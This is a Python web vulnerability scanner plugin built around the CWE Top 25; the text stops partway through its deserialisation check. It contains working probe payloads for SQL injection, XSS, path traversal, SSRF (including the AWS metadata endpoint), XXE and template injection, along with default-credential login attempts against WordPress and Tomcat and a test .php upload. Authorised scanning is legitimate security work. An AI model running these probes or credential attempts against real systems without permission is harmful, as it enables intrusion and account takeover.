"""
plugins/vulnscan.py — OWASP CWE Top 25 + Web Vulnerability Scanner

Covers all 2024 OWASP CWE Top 25 Most Dangerous Software Weaknesses
plus extended web vulnerability detection categories.

Detection categories:
  [A] Injection (CWE-89, 78, 77, 917)  — SQL, OS, LDAP, Expression Language
  [B] Broken Auth (CWE-287, 306, 798)   — Default creds, session issues
  [C] XSS (CWE-79, 80)                  — Reflected, Stored, DOM-based
  [D] IDOR (CWE-284, 639)               — Insecure direct object references
  [E] Security Misconfig (CWE-16, 732)  — Headers, methods, debug modes
  [F] Sensitive Data (CWE-312, 319)     — Cleartext, exposed secrets
  [G] XXE (CWE-611)                     — XML external entity injection
  [H] SSRF (CWE-918)                    — Server-side request forgery
  [I] Path Traversal (CWE-22)           — Directory traversal
  [J] Insecure Deserialisation (CWE-502)
  [K] Known CVEs (CWE-1035)             — CVE lookup via version banners
  [L] CSRF (CWE-352)                    — Token presence check
  [M] Open Redirect (CWE-601)
  [N] HTTP Request Smuggling (CWE-444)
  [O] Clickjacking (CWE-1021)
  [P] Rate Limiting / DoS (CWE-770)
  [Q] File Upload (CWE-434)
  [R] Business Logic / Mass Assignment
  [S] GraphQL Introspection / API exposure
  [T] Subdomain Enumeration + takeover

All probes are passive or semi-passive (no destructive payloads sent to DB).
Use only on systems you are authorised to test.
"""

import re
import os
import time
import socket
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.banner import print_status, print_finding, print_table, print_section, C
from utils.shell import run_cmd, cmd_exists

# ── OWASP CWE Top 25 (2024) reference table ──────────────────────────────────
CWE_TOP25 = [
    ("CWE-787",  1,  "Out-of-bounds Write"),
    ("CWE-79",   2,  "Cross-site Scripting (XSS)"),
    ("CWE-89",   3,  "SQL Injection"),
    ("CWE-416",  4,  "Use After Free"),
    ("CWE-78",   5,  "OS Command Injection"),
    ("CWE-20",   6,  "Improper Input Validation"),
    ("CWE-125",  7,  "Out-of-bounds Read"),
    ("CWE-22",   8,  "Path Traversal"),
    ("CWE-352",  9,  "Cross-Site Request Forgery (CSRF)"),
    ("CWE-434",  10, "Unrestricted File Upload"),
    ("CWE-862",  11, "Missing Authorisation"),
    ("CWE-476",  12, "NULL Pointer Dereference"),
    ("CWE-287",  13, "Improper Authentication"),
    ("CWE-190",  14, "Integer Overflow or Wraparound"),
    ("CWE-502",  15, "Deserialisation of Untrusted Data"),
    ("CWE-77",   16, "Command Injection"),
    ("CWE-119",  17, "Buffer Overflow"),
    ("CWE-798",  18, "Use of Hard-coded Credentials"),
    ("CWE-918",  19, "Server-Side Request Forgery (SSRF)"),
    ("CWE-306",  20, "Missing Auth for Critical Function"),
    ("CWE-362",  21, "Race Condition"),
    ("CWE-269",  22, "Improper Privilege Management"),
    ("CWE-94",   23, "Code Injection"),
    ("CWE-863",  24, "Incorrect Authorisation"),
    ("CWE-276",  25, "Incorrect Default Permissions"),
]

# ── SQL Injection detection payloads (error-based detection only) ─────────────
SQLI_PROBES = [
    ("'",           "single quote — basic string terminator"),
    ("''",          "double single quote — MySQL/MSSQL comment"),
    ("' OR '1'='1", "classic OR tautology"),
    ("' AND SLEEP(0)--", "time-based blind probe (0s — no delay expected)"),
    (";",           "statement terminator"),
    ("\\",          "backslash escape test"),
]

SQLI_ERROR_SIGS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query",
    "sqlstate",
    "ora-",
    "db2 sql error",
    "microsoft jet database",
    "odbc microsoft access",
    "jdbc",
    "sqlite_master",
    "syntax error.*sql",
    "unterminated string constant",
    "division by zero",
]

# ── XSS detection markers ─────────────────────────────────────────────────────
XSS_PROBES = [
    ('<script>alert(1)</script>',         "basic script tag"),
    ('<img src=x onerror=alert(1)>',      "img onerror event"),
    ('"><script>alert(1)</script>',       "attribute breakout"),
    ("javascript:alert(1)",               "javascript: URI"),
    ('<svg onload=alert(1)>',             "SVG onload"),
    ('{{7*7}}',                           "template injection probe (SSTI)"),
    ('${7*7}',                            "EL injection probe"),
]
XSS_REFLECT_MARKER = "xss_phantomx_marker_12345"

# ── Path traversal payloads ───────────────────────────────────────────────────
TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd",             "unix passwd"),
    ("..%2F..%2F..%2Fetc%2Fpasswd",    "URL-encoded unix"),
    ("....//....//....//etc/passwd",    "double-dot bypass"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "full URL encoding"),
    ("../../../windows/win.ini",        "windows ini"),
    ("..\\..\\..\\windows\\win.ini",    "backslash windows"),
]
TRAVERSAL_SIGS = ["root:x:", "daemon:", "[fonts]", "[extensions]", "bin/bash"]

# ── SSRF payloads ─────────────────────────────────────────────────────────────
SSRF_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
    ("http://localhost/",                         "localhost loopback"),
    ("http://127.0.0.1/",                         "127.0.0.1 loopback"),
    ("http://[::1]/",                             "IPv6 loopback"),
    ("file:///etc/passwd",                        "file:// LFI via SSRF"),
]

# ── XXE payloads ──────────────────────────────────────────────────────────────
XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

# ── Default credential pairs for common services ─────────────────────────────
DEFAULT_CREDS = {
    "tomcat":   [("tomcat","tomcat"),("admin","admin"),("tomcat","s3cret")],
    "jenkins":  [("admin","admin"),("jenkins","jenkins")],
    "grafana":  [("admin","admin")],
    "phpmyadmin":[("root",""),("root","root"),("admin","admin")],
    "wordpress":[("admin","admin"),("admin","password")],
    "kibana":   [("elastic","changeme"),("elastic","elastic")],
    "rabbitmq": [("guest","guest")],
    "redis":    [("","")],
    "mongodb":  [("admin","admin")],
}

# ── Open redirect test ────────────────────────────────────────────────────────
REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnUrl", "dest",
                   "destination", "redir", "redirect_uri", "callback", "goto",
                   "target", "out", "view", "loginto", "image_url", "go"]


def run(args, verbose=False):
    results  = {}
    target   = getattr(args, "target", "127.0.0.1")
    port     = int(getattr(args, "port", 80))
    scheme   = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}:{port}"

    print_status(f"Target: {base_url}", "info")
    print_status("Scope: OWASP CWE Top 25 + Extended Web Vulnerability Detection", "info")

    # Print CWE Top 25 reference
    if verbose:
        _print_cwe_table()

    # Discovery phase: find injectable parameters
    params = _discover_parameters(results, base_url, verbose)

    # Run vulnerability checks
    _check_sql_injection(results, base_url, params, verbose)
    _check_xss(results, base_url, params, verbose)
    _check_path_traversal(results, base_url, params, verbose)
    _check_ssrf(results, base_url, params, verbose)
    _check_xxe(results, base_url, verbose)
    _check_ssti(results, base_url, params, verbose)
    _check_open_redirect(results, base_url, params, verbose)
    _check_csrf(results, base_url, verbose)
    _check_idor(results, base_url, verbose)
    _check_file_upload(results, base_url, verbose)
    _check_default_creds(results, base_url, verbose)
    _check_clickjacking(results, base_url, verbose)
    _check_rate_limiting(results, base_url, verbose)
    _check_graphql(results, base_url, verbose)
    _check_api_exposure(results, base_url, verbose)
    _check_http_smuggling(results, base_url, verbose)
    _check_insecure_deserialisation(results, base_url, verbose)
    _check_cve_banners(results, base_url, verbose)
    _check_subdomain_takeover(results, target, verbose)

    _print_vuln_summary(results)
    return results


# ── Parameter Discovery ───────────────────────────────────────────────────────

def _discover_parameters(results, base_url, verbose):
    """Crawl homepage and extract query parameters for injection testing."""
    print_status("Discovering injectable parameters…", "info")
    params = []

    rc, body = run_cmd(f"curl -sk -m10 '{base_url}/' 2>/dev/null", timeout=14)

    # Extract form inputs
    form_actions = re.findall(r'<form[^>]*action=["\']?([^"\'> ]+)', body, re.IGNORECASE)
    form_inputs  = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', body, re.IGNORECASE)
    form_names   = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', body, re.IGNORECASE)

    # Extract links with query strings
    hrefs = re.findall(r'href=["\']([^"\']+\?[^"\']+)', body, re.IGNORECASE)
    for href in hrefs:
        parsed = urllib.parse.urlparse(href)
        qs     = urllib.parse.parse_qs(parsed.query)
        for key in qs:
            url = f"{base_url}{parsed.path}" if href.startswith("/") else href.split("?")[0]
            params.append({"url": url, "param": key, "method": "GET"})

    # Add discovered form fields
    for action in (form_actions or ["/"]):
        url = f"{base_url}{action}" if action.startswith("/") else f"{base_url}/{action}"
        for name in form_inputs:
            params.append({"url": url, "param": name, "method": "POST"})

    # Add common parameter names to homepage for blind testing
    common_params = ["id", "q", "search", "query", "user", "username", "page",
                     "file", "path", "url", "cat", "category", "item", "product",
                     "order", "sort", "limit", "offset", "lang", "redirect"]
    for p in common_params:
        params.append({"url": f"{base_url}/", "param": p, "method": "GET"})

    # Deduplicate
    seen   = set()
    unique = []
    for p in params:
        key = (p["url"], p["param"])
        if key not in seen:
            seen.add(key)
            unique.append(p)

    results["discovered_params"] = len(unique)
    print_status(f"Discovered {len(unique)} parameter(s) for injection testing.", "info")
    return unique[:60]  # Cap to 60 to avoid excessive requests


# ── A: SQL Injection (CWE-89) ─────────────────────────────────────────────────

def _check_sql_injection(results, base_url, params, verbose):
    print_status("Testing SQL Injection (CWE-89)…", "info")
    findings = []

    def probe_sqli(p, payload, desc):
        url    = p["url"]
        param  = p["param"]
        method = p["method"]

        if method == "GET":
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            rc, resp = run_cmd(f"curl -sk -m8 '{test_url}' 2>/dev/null", timeout=10)
        else:
            rc, resp = run_cmd(
                f"curl -sk -m8 -X POST -d '{param}={urllib.parse.quote(payload)}' '{url}' 2>/dev/null",
                timeout=10
            )
        resp_lower = resp.lower()
        for sig in SQLI_ERROR_SIGS:
            if re.search(sig, resp_lower):
                return {"url": url, "param": param, "payload": payload,
                        "desc": desc, "sig": sig, "cwe": "CWE-89",
                        "severity": "critical"}
        return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = []
        for p in params[:20]:
            for payload, desc in SQLI_PROBES[:3]:  # Limit to error-based probes
                futures.append(ex.submit(probe_sqli, p, payload, desc))
        for fut in as_completed(futures):
            r = fut.result()
            if r:
                # Avoid duplicates per param
                if not any(f["param"] == r["param"] and f["url"] == r["url"]
                           for f in findings):
                    findings.append(r)

    results["sqli"] = findings
    if findings:
        print_finding(
            f"SQL Injection — CWE-89 ({len(findings)} parameter(s) vulnerable)",
            "\n".join(f"  [CRITICAL] {f['url']} | param={f['param']} | sig: {f['sig']}"
                      for f in findings),
            "critical"
        )
    else:
        print_status("No SQL injection errors detected (error-based probe).", "miss")


# ── B: XSS — Reflected (CWE-79) ──────────────────────────────────────────────

def _check_xss(results, base_url, params, verbose):
    print_status("Testing Cross-Site Scripting — CWE-79…", "info")
    findings = []

    marker = XSS_REFLECT_MARKER
    for p in params[:20]:
        url   = p["url"]
        param = p["param"]
        if p["method"] == "GET":
            test_url = f"{url}?{param}={marker}"
            rc, resp = run_cmd(f"curl -sk -m8 '{test_url}' 2>/dev/null", timeout=10)
        else:
            rc, resp = run_cmd(
                f"curl -sk -m8 -X POST -d '{param}={marker}' '{url}' 2>/dev/null",
                timeout=10
            )
        if marker in resp:
            # Test with actual XSS payloads to verify no encoding
            for xss_payload, desc in XSS_PROBES[:3]:
                enc_payload = urllib.parse.quote(xss_payload)
                if p["method"] == "GET":
                    t2 = f"{url}?{param}={enc_payload}"
                    rc2, resp2 = run_cmd(f"curl -sk -m8 '{t2}' 2>/dev/null", timeout=10)
                else:
                    rc2, resp2 = run_cmd(
                        f"curl -sk -m8 -X POST -d '{param}={enc_payload}' '{url}' 2>/dev/null",
                        timeout=10
                    )
                # Check for unencoded reflection
                if (xss_payload in resp2 or
                        "<script>" in resp2.lower() or
                        "onerror=" in resp2.lower()):
                    findings.append({
                        "url": url, "param": param, "payload": xss_payload,
                        "type": "Reflected XSS", "desc": desc,
                        "cwe": "CWE-79", "severity": "high"
                    })
                    break

    results["xss"] = findings
    if findings:
        print_finding(
            f"Reflected XSS — CWE-79 ({len(findings)} parameter(s))",
            "\n".join(f"  [HIGH] {f['url']} | param={f['param']} | {f['desc']}"
                      for f in findings),
            "high"
        )
    else:
        print_status("No reflected XSS detected.", "miss")


# ── C: Path Traversal (CWE-22) ───────────────────────────────────────────────

def _check_path_traversal(results, base_url, params, verbose):
    print_status("Testing Path Traversal — CWE-22…", "info")
    findings = []

    file_params = [p for p in params if any(
        kw in p["param"].lower()
        for kw in ["file","path","page","doc","template","view","include","load","dir","folder"]
    )]

    for p in (file_params or params[:10]):
        for payload, desc in TRAVERSAL_PAYLOADS:
            test_url = f"{p['url']}?{p['param']}={payload}"
            rc, resp = run_cmd(f"curl -sk -m8 '{test_url}' 2>/dev/null", timeout=10)
            for sig in TRAVERSAL_SIGS:
                if sig in resp:
                    findings.append({
                        "url":      p["url"],
                        "param":    p["param"],
                        "payload":  payload,
                        "evidence": sig,
                        "cwe":      "CWE-22",
                        "severity": "critical"
                    })
                    break

    results["path_traversal"] = findings
    if findings:
        print_finding(
            f"Path Traversal — CWE-22 ({len(findings)} finding(s))",
            "\n".join(f"  [CRITICAL] {f['url']} | param={f['param']} | evidence: {f['evidence']}"
                      for f in findings),
            "critical"
        )
    else:
        print_status("No path traversal detected.", "miss")


# ── D: SSRF (CWE-918) ────────────────────────────────────────────────────────

def _check_ssrf(results, base_url, params, verbose):
    print_status("Testing Server-Side Request Forgery — CWE-918…", "info")
    findings = []

    # Find URL-like parameters
    url_params = [p for p in params if any(
        kw in p["param"].lower()
        for kw in ["url","uri","link","src","source","href","fetch","load",
                   "resource","redirect","proxy","target","endpoint","request","host"]
    )]

    for p in (url_params or params[:5]):
        for ssrf_url, desc in SSRF_TARGETS[:3]:
            enc = urllib.parse.quote(ssrf_url, safe="")
            test_url = f"{p['url']}?{p['param']}={enc}"
            rc, resp = run_cmd(
                f"curl -sk -m6 '{test_url}' 2>/dev/null | head -50", timeout=10
            )
            # SSRF indicators: metadata content, internal page content
            if any(sig in resp.lower() for sig in
                   ["ami-id","instance-id","169.254","root:x:","<html"]):
                if "169.254" in ssrf_url or "localhost" in ssrf_url:
                    findings.append({
                        "url":      p["url"],
                        "param":    p["param"],
                        "target":   ssrf_url,
                        "desc":     desc,
                        "cwe":      "CWE-918",
                        "severity": "critical"
                    })

    results["ssrf"] = findings
    if findings:
        print_finding(
            f"SSRF — CWE-918 ({len(findings)} finding(s))",
            "\n".join(f"  [CRITICAL] param={f['param']} → {f['target']}" for f in findings),
            "critical"
        )
    else:
        print_status("No SSRF detected.", "miss")


# ── E: XXE (CWE-611) ─────────────────────────────────────────────────────────

def _check_xxe(results, base_url, verbose):
    print_status("Testing XML External Entity — CWE-611…", "info")
    findings = []

    # Find XML/SOAP endpoints
    xml_endpoints = []
    rc, body = run_cmd(f"curl -sk -m8 '{base_url}/' 2>/dev/null", timeout=12)

    # Look for API/SOAP endpoints
    api_paths = re.findall(r'(?:action|href)=["\']([^"\']*(?:xml|soap|api|ws|service)[^"\']*)["\']',
                           body, re.IGNORECASE)
    xml_endpoints = [f"{base_url}{p}" if p.startswith("/") else f"{base_url}/{p}"
                     for p in api_paths[:5]]
    xml_endpoints.append(f"{base_url}/api/xml")
    xml_endpoints.append(f"{base_url}/soap")

    for endpoint in xml_endpoints[:6]:
        rc, resp = run_cmd(
            f"curl -sk -m8 -X POST "
            f"-H 'Content-Type: application/xml' "
            f"-d '{XXE_PAYLOAD}' '{endpoint}' 2>/dev/null",
            timeout=10
        )
        if any(sig in resp for sig in ["root:x:", "daemon:", "bin/bash", "nobody"]):
            findings.append({
                "url":      endpoint,
                "evidence": "File contents in response",
                "cwe":      "CWE-611",
                "severity": "critical"
            })

    results["xxe"] = findings
    if findings:
        print_finding(
            f"XXE Injection — CWE-611 ({len(findings)} endpoint(s))",
            "\n".join(f"  [CRITICAL] {f['url']}" for f in findings),
            "critical"
        )
    else:
        print_status("No XXE detected on XML endpoints.", "miss")


# ── F: SSTI (CWE-94 / CWE-1336) ──────────────────────────────────────────────

def _check_ssti(results, base_url, params, verbose):
    print_status("Testing Server-Side Template Injection — CWE-94…", "info")
    findings = []

    # Mathematical probes — if 7*7 → 49 in response, SSTI confirmed
    ssti_probes = [
        ("{{7*7}}",          "49",  "Jinja2/Twig/Pebble"),
        ("${7*7}",           "49",  "FreeMarker/Thymeleaf/EL"),
        ("<%= 7*7 %>",       "49",  "ERB/JSP"),
        ("#{7*7}",           "49",  "Ruby/Pebble"),
        ("*{7*7}",           "49",  "Thymeleaf"),
        ("{{7*'7'}}",        "7777777","Jinja2 string multiply"),
    ]

    for p in params[:15]:
        for payload, expected, engine in ssti_probes:
            enc = urllib.parse.quote(payload)
            if p["method"] == "GET":
                test_url = f"{p['url']}?{p['param']}={enc}"
                rc, resp = run_cmd(f"curl -sk -m8 '{test_url}' 2>/dev/null", timeout=10)
            else:
                rc, resp = run_cmd(
                    f"curl -sk -m8 -X POST -d '{p['param']}={enc}' '{p['url']}' 2>/dev/null",
                    timeout=10
                )
            if expected in resp:
                findings.append({
                    "url":     p["url"],
                    "param":   p["param"],
                    "payload": payload,
                    "engine":  engine,
                    "cwe":     "CWE-94",
                    "severity":"critical"
                })
                break  # One confirmation per param is enough

    results["ssti"] = findings
    if findings:
        print_finding(
            f"Server-Side Template Injection — CWE-94 ({len(findings)} finding(s))",
            "\n".join(f"  [CRITICAL] {f['url']} | param={f['param']} | engine: {f['engine']}"
                      for f in findings),
            "critical"
        )
    else:
        print_status("No SSTI detected.", "miss")


# ── G: Open Redirect (CWE-601) ───────────────────────────────────────────────

def _check_open_redirect(results, base_url, params, verbose):
    print_status("Testing Open Redirect — CWE-601…", "info")
    findings = []
    canary   = "https://example-redirect-canary.com"

    redirect_params = [p for p in params if any(
        kw in p["param"].lower() for kw in REDIRECT_PARAMS
    )]

    for p in redirect_params[:10]:
        enc = urllib.parse.quote(canary)
        test_url = f"{p['url']}?{p['param']}={enc}"
        rc, resp = run_cmd(
            f"curl -sk -m8 -o /dev/null -D - '{test_url}' 2>/dev/null | head -20",
            timeout=10
        )
        if "example-redirect-canary.com" in resp:
            m = re.search(r'^[Ll]ocation:\s*(.+)$', resp, re.MULTILINE)
            dest = m.group(1).strip() if m else "unknown"
            findings.append({
                "url":      p["url"],
                "param":    p["param"],
                "location": dest,
                "cwe":      "CWE-601",
                "severity": "medium"
            })

    results["open_redirect"] = findings
    if findings:
        print_finding(
            f"Open Redirect — CWE-601 ({len(findings)} finding(s))",
            "\n".join(f"  [MEDIUM] {f['url']} | param={f['param']} → {f['location']}"
                      for f in findings),
            "medium"
        )
    else:
        print_status("No open redirect detected.", "miss")


# ── H: CSRF Token Check (CWE-352) ─────────────────────────────────────────────

def _check_csrf(results, base_url, verbose):
    print_status("Checking CSRF protection — CWE-352…", "info")
    rc, body = run_cmd(f"curl -sk -m10 '{base_url}/' 2>/dev/null", timeout=14)

    issues = []
    forms  = re.findall(r'<form[^>]*>(.*?)</form>', body, re.IGNORECASE | re.DOTALL)

    for i, form in enumerate(forms[:5]):
        has_token = bool(re.search(
            r'name=["\'](_?csrf|token|authenticity_token|_token|csrfmiddlewaretoken)["\']',
            form, re.IGNORECASE
        ))
        has_method_post = "method" in form.lower() and "post" in form.lower()
        if has_method_post and not has_token:
            issues.append(f"Form #{i+1} — POST form with no visible CSRF token")

    # Check SameSite cookie flags
    rc2, headers = run_cmd(f"curl -skI -m8 '{base_url}/' 2>/dev/null", timeout=12)
    cookies      = re.findall(r'set-cookie:.*', headers, re.IGNORECASE)
    for cookie in cookies:
        if "samesite=strict" not in cookie.lower() and "samesite=lax" not in cookie.lower():
            issues.append(f"Cookie without SameSite: {cookie[:80]}")

    results["csrf"] = issues
    if issues:
        print_finding(
            f"CSRF Weaknesses — CWE-352 ({len(issues)})",
            "\n".join(f"  [MEDIUM] {i}" for i in issues),
            "medium"
        )
    else:
        print_status("CSRF tokens found on forms.", "miss")


# ── I: IDOR (CWE-639) ────────────────────────────────────────────────────────

def _check_idor(results, base_url, verbose):
    print_status("Probing for IDOR — CWE-639 / CWE-284…", "info")
    findings = []

    # Common IDOR-prone endpoints
    idor_paths = [
        "/api/user/1", "/api/user/2",
        "/user/1/profile", "/user/2/profile",
        "/account/1", "/account/2",
        "/order/1", "/order/100",
        "/invoice/1", "/invoice/100",
        "/admin/user/1", "/api/v1/users/1",
    ]

    for path in idor_paths:
        rc, resp = run_cmd(
            f"curl -sk -m6 -o /dev/null -w '%{{http_code}}' '{base_url}{path}' 2>/dev/null",
            timeout=8
        )
        code = resp.strip()
        if code == "200":
            # Check if response contains user-like data
            rc2, body = run_cmd(
                f"curl -sk -m6 '{base_url}{path}' 2>/dev/null | head -50",
                timeout=8
            )
            if any(k in body.lower() for k in ["email","username","user_id","userid",
                                                 "password","phone","address","token"]):
                findings.append({
                    "path":     path,
                    "code":     code,
                    "evidence": "User data fields in unauthenticated response",
                    "cwe":      "CWE-639",
                    "severity": "high"
                })

    results["idor"] = findings
    if findings:
        print_finding(
            f"Potential IDOR — CWE-639 ({len(findings)} endpoint(s))",
            "\n".join(f"  [HIGH] {base_url}{f['path']} → {f['evidence']}" for f in findings),
            "high"
        )
    else:
        print_status("No obvious IDOR found on common API paths.", "miss")


# ── J: Unrestricted File Upload (CWE-434) ────────────────────────────────────

def _check_file_upload(results, base_url, verbose):
    print_status("Testing file upload endpoints — CWE-434…", "info")
    findings = []

    upload_paths = ["/upload", "/api/upload", "/file/upload",
                    "/admin/upload", "/media/upload", "/image/upload"]

    for path in upload_paths:
        # Test with php file extension
        rc, resp = run_cmd(
            f"curl -sk -m8 -o /dev/null -w '%{{http_code}}' "
            f"-F 'file=@/dev/null;filename=test.php;type=application/x-php' "
            f"'{base_url}{path}' 2>/dev/null",
            timeout=10
        )
        code = resp.strip()
        if code in ("200", "201"):
            findings.append({
                "path": path, "test": "PHP file extension accepted",
                "code": code, "cwe": "CWE-434", "severity": "critical"
            })
        elif code not in ("000", ""):
            # Endpoint exists — manually note it
            if code == "405":
                pass  # Expected GET-only endpoint
            elif verbose:
                print_status(f"  Upload endpoint exists: {path} ({code})", "info")

    results["file_upload"] = findings
    if findings:
        print_finding(
            f"Unrestricted File Upload — CWE-434 ({len(findings)})",
            "\n".join(f"  [CRITICAL] {base_url}{f['path']} — {f['test']}" for f in findings),
            "critical"
        )
    else:
        print_status("No unrestricted file upload endpoints detected.", "miss")


# ── K: Default Credentials (CWE-798) ─────────────────────────────────────────

def _check_default_creds(results, base_url, verbose):
    print_status("Testing default credentials — CWE-798…", "info")
    findings = []

    # Detect which panels are present
    rc, body = run_cmd(f"curl -sk -m8 '{base_url}/' 2>/dev/null", timeout=12)
    body_low = body.lower()

    # WordPress
    if "wp-" in body_low or "wordpress" in body_low:
        for user, passwd in DEFAULT_CREDS["wordpress"]:
            rc, resp = run_cmd(
                f"curl -sk -m8 -c /tmp/px_cookies.txt "
                f"-d 'log={user}&pwd={passwd}&wp-submit=Log+In' "
                f"'{base_url}/wp-login.php' -D - 2>/dev/null | head -5",
                timeout=10
            )
            if "dashboard" in resp.lower() or "location: /wp-admin" in resp.lower():
                findings.append(("WordPress", f"{user}:{passwd}", "Admin panel access"))
                break

    # Generic admin panels
    for path, (user, passwd), label in [
        ("/manager/html",    ("tomcat","tomcat"), "Tomcat"),
        ("/admin",           ("admin","admin"),   "Generic admin"),
    ]:
        rc, resp = run_cmd(
            f"curl -sk -m8 -u '{user}:{passwd}' "
            f"'{base_url}{path}' -o /dev/null -w '%{{http_code}}' 2>/dev/null",
            timeout=8
        )
        if resp.strip() == "200":
            findings.append((label, f"{user}:{passwd}", f"Authenticated at {path}"))

    results["default_creds"] = findings
    if findings:
        print_finding(
            f"Default Credentials — CWE-798 ({len(findings)})",
            "\n".join(f"  [CRITICAL] {f[0]}: {f[1]} — {f[2]}" for f in findings),
            "critical"
        )
    else:
        print_status("No default credentials accepted.", "miss")


# ── L: Clickjacking (CWE-1021) ───────────────────────────────────────────────

def _check_clickjacking(results, base_url, verbose):
    print_status("Checking Clickjacking protection — CWE-1021…", "info")
    rc, headers = run_cmd(f"curl -skI -m8 '{base_url}/' 2>/dev/null", timeout=12)
    headers_low = headers.lower()

    issues = []
    if "x-frame-options" not in headers_low:
        if "frame-ancestors" not in headers_low:
            issues.append("No X-Frame-Options and no CSP frame-ancestors — page can be embedded")

    # Check for frameable login pages
    rc2, login_hdrs = run_cmd(
        f"curl -skI -m8 '{base_url}/login' 2>/dev/null", timeout=10
    )
    if "x-frame-options" not in login_hdrs.lower():
        issues.append("Login page missing X-Frame-Options")

    results["clickjacking"] = issues
    if issues:
        print_finding(
            f"Clickjacking — CWE-1021 ({len(issues)})",
            "\n".join(f"  [MEDIUM] {i}" for i in issues),
            "medium"
        )
    else:
        print_status("Clickjacking protection present.", "miss")


# ── M: Rate Limiting / DoS (CWE-770) ─────────────────────────────────────────

def _check_rate_limiting(results, base_url, verbose):
    print_status("Testing rate limiting on login endpoint — CWE-770…", "info")

    login_paths = ["/login", "/api/login", "/auth", "/signin", "/wp-login.php", "/user/login"]
    tested = []

    for path in login_paths:
        # Check if endpoint exists
        rc, code = run_cmd(
            f"curl -sk -m5 -o /dev/null -w '%{{http_code}}' '{base_url}{path}' 2>/dev/null",
            timeout=8
        )
        if code.strip() in ("200","405"):
            tested.append(path)

    findings = []
    for path in tested[:2]:
        codes = []
        for _ in range(8):
            rc, resp = run_cmd(
                f"curl -sk -m5 -o /dev/null -w '%{{http_code}}' "
                f"-X POST -d 'username=test&password=wrong' "
                f"'{base_url}{path}' 2>/dev/null",
                timeout=6
            )
            codes.append(resp.strip())
            time.sleep(0.1)

        # If all attempts return same non-429 code, no rate limiting
        if codes and all(c not in ("429","423","503") for c in codes):
            if len(set(codes)) <= 2:  # Consistent response suggests no lockout
                findings.append({
                    "path":    path,
                    "codes":   codes[:5],
                    "cwe":     "CWE-770",
                    "severity":"medium"
                })

    results["rate_limiting"] = findings
    if findings:
        print_finding(
            f"Missing Rate Limiting — CWE-770 ({len(findings)} endpoint(s))",
            "\n".join(f"  [MEDIUM] {base_url}{f['path']} — no 429/lockout after 8 requests"
                      for f in findings),
            "medium"
        )
    elif tested:
        print_status("Rate limiting / lockout appears active.", "miss")
    else:
        print_status("No login endpoints found for rate limit testing.", "miss")


# ── N: GraphQL Introspection (CWE-284) ───────────────────────────────────────

def _check_graphql(results, base_url, verbose):
    print_status("Testing GraphQL introspection — CWE-284…", "info")
    gql_paths = ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"]
    findings  = []

    introspection_query = '{"query":"{__schema{types{name}}}"}'

    for path in gql_paths:
        rc, resp = run_cmd(
            f"curl -sk -m8 -X POST "
            f"-H 'Content-Type: application/json' "
            f"-d '{introspection_query}' "
            f"'{base_url}{path}' 2>/dev/null | head -5",
            timeout=10
        )
        if '"__schema"' in resp or '"types"' in resp:
            # Count types for severity context
            type_count = len(re.findall(r'"name"', resp))
            findings.append({
                "path":      path,
                "types":     type_count,
                "cwe":       "CWE-284",
                "severity":  "medium"
            })

    results["graphql"] = findings
    if findings:
        print_finding(
            f"GraphQL Introspection Enabled — CWE-284 ({len(findings)} endpoint(s))",
            "\n".join(f"  [MEDIUM] {base_url}{f['path']} — schema exposed" for f in findings),
            "medium"
        )
    else:
        print_status("No GraphQL introspection found.", "miss")


# ── O: API Exposure ───────────────────────────────────────────────────────────

def _check_api_exposure(results, base_url, verbose):
    print_status("Checking API documentation exposure…", "info")
    api_paths = [
        "/swagger.json", "/swagger-ui.html", "/swagger-ui/",
        "/api-docs", "/openapi.json", "/api/swagger.json",
        "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/.well-known/openapi", "/redoc",
    ]
    found = []

    for path in api_paths:
        rc, code = run_cmd(
            f"curl -sk -m5 -o /dev/null -w '%{{http_code}}' '{base_url}{path}' 2>/dev/null",
            timeout=8
        )
        if code.strip() == "200":
            found.append(path)

    results["api_exposure"] = found
    if found:
        print_finding(
            f"API Documentation Exposed ({len(found)} endpoint(s))",
            "\n".join(f"  [MEDIUM] {base_url}{p}" for p in found),
            "medium"
        )
    else:
        print_status("No exposed API documentation found.", "miss")


# ── P: HTTP Request Smuggling (CWE-444) ──────────────────────────────────────

def _check_http_smuggling(results, base_url, verbose):
    print_status("Testing HTTP Request Smuggling indicators — CWE-444…", "info")
    issues = []

    # Passive: check for conflicting Transfer-Encoding and Content-Length
    rc, headers = run_cmd(
        f"curl -sk -m8 -X POST "
        f"-H 'Transfer-Encoding: chunked' "
        f"-H 'Content-Length: 4' "
        f"-d '0\\r\\n\\r\\n' "
        f"'{base_url}/' -D - 2>/dev/null | head -20",
        timeout=10
    )
    # A 200 when both headers sent suggests possible smuggling vector
    if re.search(r'^HTTP/\d\.\d 200', headers, re.MULTILINE):
        issues.append("Server accepted both Transfer-Encoding and Content-Length headers")

    # Check for HTTP/2 downgrade indicators
    rc2, h2_check = run_cmd(
        f"curl -sk -m8 --http2 -o /dev/null -w '%{{http_version}}' '{base_url}/' 2>/dev/null",
        timeout=10
    )
    if h2_check.strip() == "2":
        issues.append("HTTP/2 supported — test CL.0 and H2.TE smuggling manually (use smuggler.py)")

    results["http_smuggling"] = issues
    if issues:
        print_finding(
            f"HTTP Smuggling Indicators — CWE-444 ({len(issues)})",
            "\n".join(f"  [MEDIUM] {i}" for i in issues),
            "medium"
        )
    else:
        print_status("No obvious HTTP smuggling indicators.", "miss")


# ── Q: Insecure Deserialisation (CWE-502) ────────────────────────────────────

def _check_insecure_deserialisation(results, base_url, verbose):
    print_status("Testing deserialisation indicators — CWE-502…", "info")
    issues = []

